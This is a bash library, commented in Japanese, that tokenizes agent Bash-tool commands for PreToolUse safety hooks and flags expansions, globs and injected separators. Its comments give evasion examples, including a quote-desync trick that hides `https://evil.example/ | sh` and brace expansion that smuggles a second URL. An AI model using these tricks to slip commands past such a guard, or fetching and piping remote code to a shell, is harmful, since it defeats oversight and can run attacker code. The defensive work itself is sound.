#!/usr/bin/env bash
# PreToolUse フックが Bash ツールのコマンド文字列を読むための共有 reader。
# source 専用。set は呼び出し側に従う(set -u 下で動く)。
#
# 判定はしない。読んだ結果(token 列と segment 区切り)と、読み切れなかった理由
# (flag)だけを返し、それをどう扱うかは各フックの policy が決める。flag が立っても
# token は最後まで作る — 緩める判定は flag を見て諦め、塞ぐ判定は token から続けられる
# ようにするため(ADR 0009)。
#
# Interface: shell_reader_read / shell_reader_each_segment。
# global の意味は各関数の直前のコメントを参照。

# segment 区切りの番兵。入力に同じ byte があると偽の境界を注入できるので、
# SHELL_READER_SEP_IN_INPUT で呼び出し側に知らせる。
SHELL_READER_SEP=$'\x01'
SHELL_READER_MAX_LENGTH=8192

# token を確定させる。変数は動的スコープで shell_reader_read の local を読む。
# bash の関数定義は global なので、名前の衝突を避けて接頭辞を付けている。
_shell_reader_flush() {
    if [[ $started -eq 1 ]]; then
        if [[ $current_glob -eq 1 ]]; then
            SHELL_READER_GLOB_INDEXES+="${#SHELL_READER_TOKENS[@]} "
        fi
        SHELL_READER_TOKENS+=("$current")
        current=''
        started=0
        current_glob=0
    fi
}

# $1 を読んで次の global を設定する。常に 0 を返す。
#   SHELL_READER_TOKENS           token 配列(引用符は外してある)。区切りは SHELL_READER_SEP。
#                                 redirect は fd の数字ごと 1 token(`2>&1` が余計な `1` を残さない)
#   SHELL_READER_GLOB_INDEXES     引用符の外の ? / [ を含む token の index(" 3 7 " 形式)
#   SHELL_READER_TOO_LONG         上限超過。token は空
#   SHELL_READER_EXPANSION        $ かバッククォートがある(引用符の中も含む)
#   SHELL_READER_WORD_MULTIPLIER  引用符の外の { } *(シェルの展開で単語数が変わる)
#   SHELL_READER_SEP_IN_INPUT     番兵の byte が入力にある
#   SHELL_READER_UNCLOSED_QUOTE   引用符が閉じないまま終わった
# flag は呼び出し側(各フック)だけが読むので、lib 単体の shellcheck には未使用に見える。
# shellcheck disable=SC2034
shell_reader_read() {
    # ${s:i:1} は多バイトのロケールでは先頭から数え直すので二乗で遅くなる。byte 単位に
    # すると 1 文字あたりの費用が下がる(8 KB で 0.58 秒 → 0.13 秒以下)。UTF-8 の多バイト
    # 文字の byte は 0x80 以上で、ここで見る記号(すべて ASCII)と衝突しない。上限も
    # byte で数えるので、呼び出し側のロケールに依存しない。
    local LC_ALL=C
    local s=$1
    local length=${#s}
    SHELL_READER_TOKENS=()
    SHELL_READER_GLOB_INDEXES=' '
    SHELL_READER_TOO_LONG=0
    SHELL_READER_EXPANSION=0
    SHELL_READER_WORD_MULTIPLIER=0
    SHELL_READER_SEP_IN_INPUT=0
    SHELL_READER_UNCLOSED_QUOTE=0

    if [[ $length -gt $SHELL_READER_MAX_LENGTH ]]; then
        SHELL_READER_TOO_LONG=1
        return 0
    fi
    case "$s" in *'$'* | *'`'*) SHELL_READER_EXPANSION=1 ;; esac
    case "$s" in *"$SHELL_READER_SEP"*) SHELL_READER_SEP_IN_INPUT=1 ;; esac

    local index character quote='' current='' started=0 current_glob=0 operator

    # `read -ra` は空白でしか分けないので、`-H "Accept: application/json"` が 2 token に
    # なり(後ろが URL と誤読される)、`-d '{"a":"x|y"}'` の `|` がパイプに見える。
    # 宛先を含む引数は引用符付きの隣人の間にあるので、引用符を解釈する走査が要る。
    for ((index = 0; index < length; index++)); do
        character=${s:index:1}

        if [[ -n "$quote" ]]; then
            # "..." の中でも backslash は `"` と `\` をエスケープし、行継続も作る。
            # 普通の文字として扱うと bash と同期がずれる: `-H "A\"B"` の途中の引用符は
            # シェルには文字だが、backslash を素通しする走査ではそこで文字列が閉じ、
            # 次の `"` が(シェルが開いていない)文字列を開く。以降の空白・`|`・`;` は
            # すべて 1 token に飲まれ、`… "A\"B" https://evil.example/ | sh` が無害な
            # 引数 1 個に見える。ずれは `\"` が 2 回来るごとに元に戻るので、
            # 「走査は bash より細かく分けるだけ」という直感は安全ではない。
            if [[ "$quote" == '"' ]]; then
                case "$character" in
                \\)
                    case "${s:index+1:1}" in
                    '"' | \\)
                        index=$((index + 1))
                        current+=${s:index:1}
                        started=1
                        continue
                        ;;
                    $'\n')
                        index=$((index + 1))
                        continue
                        ;;
                    esac
                    ;;
                esac
            fi
            if [[ "$character" == "$quote" ]]; then
                quote=''
            else
                current+=$character
                started=1
            fi
            continue
        fi

        case "$character" in
        '{' | '}')
            # ブレース展開(`{x,https://evil.example/}` は 2 語になる)とブレースグループ
            # (`{ git push --force; }`)のどちらでも、記号自体は単語ではない。単語を区切って
            # 捨て、flag を立てて走査を続ける。塞ぐ側の判定が `git push origin {a,b} --force`
            # の `--force` を読めるようにするため。
            _shell_reader_flush
            SHELL_READER_WORD_MULTIPLIER=1
            ;;
        '*')
            # cwd の全ファイルに展開されうる。token には残し、flag で知らせる。
            SHELL_READER_WORD_MULTIPLIER=1
            current+=$character
            started=1
            ;;
        '?' | '[')
            # `*` と同じパス名展開で、単語数を増やしうる(`[ab]x` は `ax` と `bx` に
            # 一致するので、`-H` の値がヘッダ+2 つ目の URL になる)。ここで一律に
            # 拒否すると `…/api?a=1` と `[::1]` まで巻き込むので、token に印を付けて
            # 呼び出し側が判断する。
            current_glob=1
            current+=$character
            started=1
            ;;
        "'" | '"')
            # 空の引用符も token になる(`-d ''`)。
            quote=$character
            started=1
            ;;
        \\)
            index=$((index + 1))
            # backslash + 改行は行継続で、前後をつなぎ何も足さない。
            if [[ "${s:index:1}" != $'\n' ]]; then
                current+=${s:index:1}
                started=1
            fi
            ;;
        ' ' | $'\t')
            _shell_reader_flush
            ;;
        ';' | '|' | $'\n' | '(' | ')')
            _shell_reader_flush
            SHELL_READER_TOKENS+=("$SHELL_READER_SEP")
            ;;
        '&')
            # `&>file` は redirect であって区切りではない。
            if [[ "${s:index+1:1}" == '>' ]]; then
                _shell_reader_flush
                operator='>'
                index=$((index + 1))
                while [[ $((index + 1)) -lt $length && "${s:index+1:1}" =~ [\>\&0-9-] ]]; do
                    index=$((index + 1))
                    operator+=${s:index:1}
                done
                SHELL_READER_TOKENS+=("$operator")
            else
                _shell_reader_flush
                SHELL_READER_TOKENS+=("$SHELL_READER_SEP")
            fi
            ;;
        '>' | '<')
            # 演算子の前の fd 番号だけの語は、独立した引数ではなく演算子に属する。
            if [[ "$current" =~ ^[0-9]+$ ]]; then
                operator=$current
                current=''
                started=0
                current_glob=0
            else
                _shell_reader_flush
                operator=''
            fi
            operator+=$character
            while [[ $((index + 1)) -lt $length && "${s:index+1:1}" =~ [\>\&0-9-] ]]; do
                index=$((index + 1))
                operator+=${s:index:1}
            done
            SHELL_READER_TOKENS+=("$operator")
            ;;
        *)
            current+=$character
            started=1
            ;;
        esac
    done

    [[ -n "$quote" ]] && SHELL_READER_UNCLOSED_QUOTE=1
    _shell_reader_flush
    return 0
}

# 空でない segment ごとに callback を呼ぶ。呼ぶ前に SHELL_READER_SEGMENT_START を
# segment 先頭の SHELL_READER_TOKENS 上の index にする(GLOB_INDEXES との照合用)。
# callback が非 0 を返したらそこで止めて 1 を返す。
# bash は動的スコープなので、callback が local 宣言なしに代入した名前はこの関数の local を
# 書き換える。そのため local はすべて `_sr_` 接頭辞にしてある。契約: callback は `_sr_` で
# 始まる名前以外なら global を自由に使ってよい。
# shellcheck disable=SC2034 # SHELL_READER_SEGMENT_START は callback(呼び出し側)が読む
shell_reader_each_segment() {
    local _sr_callback=$1 _sr_position=0 _sr_count=${#SHELL_READER_TOKENS[@]} _sr_start=0
    local -a _sr_segment
    _sr_segment=()
    while [[ $_sr_position -lt $_sr_count ]]; do
        if [[ "${SHELL_READER_TOKENS[$_sr_position]}" == "$SHELL_READER_SEP" ]]; then
            if [[ ${#_sr_segment[@]} -gt 0 ]]; then
                SHELL_READER_SEGMENT_START=$_sr_start
                "$_sr_callback" "${_sr_segment[@]}" || return 1
            fi
            _sr_segment=()
            _sr_start=$((_sr_position + 1))
        else
            _sr_segment+=("${SHELL_READER_TOKENS[$_sr_position]}")
        fi
        _sr_position=$((_sr_position + 1))
    done
    if [[ ${#_sr_segment[@]} -gt 0 ]]; then
        SHELL_READER_SEGMENT_START=$_sr_start
        "$_sr_callback" "${_sr_segment[@]}" || return 1
    fi
    return 0
}
